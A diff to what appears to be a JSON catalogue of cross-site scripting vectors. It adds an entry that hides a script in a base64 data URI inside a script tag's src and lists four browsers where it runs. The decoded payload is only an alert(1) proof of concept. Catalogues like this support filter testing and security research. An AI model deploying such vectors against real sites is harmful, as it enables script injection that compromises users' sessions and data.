@@ -19,5 +19,15 @@
         "browsers": [
             "firefox"
         ]
+    },
+    {
+        "description": "Data protocol inside script src with base64",
+        "code": "<script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ]
     }
 ]
